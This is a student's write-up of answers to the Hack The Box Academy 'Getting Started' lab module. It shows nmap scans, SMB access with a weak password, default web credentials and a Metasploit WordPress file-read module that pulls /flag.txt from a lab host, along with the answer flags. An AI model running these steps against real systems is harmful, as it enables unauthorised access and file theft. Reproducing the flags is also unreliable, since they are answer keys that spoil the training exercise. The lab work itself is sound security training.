# Getting Started
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Getting Started
* Tier: 0
* Difficulty: Fundamental
* Category: Offensive
* Time estimate: 8 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Basic Tools
### Question:
![](./attachments/Pasted%20image%2020221117112756.png)

```
┌──(kali㉿kali)-[~]
└─$ nc 178.62.84.158 30907
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
```

**Answer:** `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1`

---
## Service Scanning
### Question 1:
![](./attachments/Pasted%20image%2020221117115657.png)
*Hint: Execute sudo nmap -sV {target IP} and check the result under Version*

```
┌──(kali㉿kali)-[~]
└─$ nmap -n -sV -p 8080 10.129.92.39
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-17 05:59 EST
Nmap scan report for 10.129.92.39
Host is up (0.036s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
```

**Answer:** `Apache Tomcat`

### Question 2:
![](./attachments/Pasted%20image%2020221117115716.png)
*Hint: Perform a full port scan using -p-*

```
┌──(kali㉿kali)-[~]
└─$ nmap -n -sV -p- 10.129.92.39
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-17 06:00 EST
Nmap scan report for 10.129.92.39
Host is up (0.039s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2323/tcp open  telnet      Linux telnetd
8080/tcp open  http        Apache Tomcat
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.64 seconds
```

**Answer:** `2323`
 
### Question 3:
![](./attachments/Pasted%20image%2020221117115744.png)
*Hint: Bob likes to use weak passwords.*

```
┌──(kali㉿kali)-[~]
└─$ smbclient -U bob \\\\10.129.92.39\\users 
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 25 18:06:52 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  flag                                D        0  Thu Feb 25 18:09:26 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

                4062912 blocks of size 1024. 944756 blocks available
smb: \> cd flag
smb: \flag\> ls
  .                                   D        0  Thu Feb 25 18:09:26 2021
  ..                                  D        0  Thu Feb 25 18:06:52 2021
  flag.txt                            N       33  Thu Feb 25 18:09:26 2021

                4062912 blocks of size 1024. 944748 blocks available
smb: \flag\> get flag.txt
getting file \flag\flag.txt of size 33 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) 
┌──(kali㉿kali)-[~]
└─$ cat flag.txt               
dceece590f3284c3866305eb2473d099
```

**Answer:** `dceece590f3284c3866305eb2473d099`

---
## Web Enumeration
### Question:
*Hint: Everything you need to login is given to you*

![](./attachments/Pasted%20image%2020221117122102.png)

Visit the show path `/admin-login-page.php`

![](./attachments/Pasted%20image%2020221117122203.png)

Default credantials are visible in the source code.

User:pass `admin:password123`

![](./attachments/Pasted%20image%2020221117122044.png)

**Answer:** `HTB{w3b_3num3r4710n_r3v34l5_53cr375}`

---
## Public Exploits
### Question:
![](./attachments/Pasted%20image%2020221117122824.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sC -sV -p32426 46.101.0.22
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-17 06:29 EST
Nmap scan report for 46.101.0.22
Host is up (0.010s latency).

PORT      STATE SERVICE VERSION
32426/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Getting Started &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.6.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.25 seconds
```

Visit the page:

![](./attachments/Pasted%20image%2020221117125435.png)

Search for `Simple Backup Plugin 2.7.10` in Metasploit.

```bash
msf6 > search exploit Simple Backup Plugin 2.7.10

Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wp_simple_backup_file_read                   normal  No     WordPress Simple Backup File Read Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read

msf6 > use 0
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set rhost 46.101.0.22
rhost => 46.101.0.22
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set rport 30846
rport => 30846
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set filepath /flag.txt
filepath => /flag.txt
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > run

[+] File saved in: /home/kali/.msf4/loot/20221117065310_default_46.101.0.22_simplebackup.tra_338516.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) >
```

Read the output file:

```
┌──(kali㉿kali)-[/usr/share/exploitdb]
└─$ cat /home/kali/.msf4/loot/20221117065310_default_46.101.0.22_simplebackup.tra_338516.txt
HTB{my_f1r57_h4ck}
```

**Answer:** `HTB{my_f1r57_h4ck}`

---
## Privilege Escalation
### Question 1:
![](./attachments/Pasted%20image%2020221117133900.png)
*Hint: Review what you learned in this module*

**Answer:** ``

### Question 2:
![](./attachments/Pasted%20image%2020221117133914.png)
*Hint: Don't forget to chmod*

**Answer:** ``

---
## 
### Question:
*Hint: *

**Answer:** ``

---
## 
### Question:
*Hint: *

**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]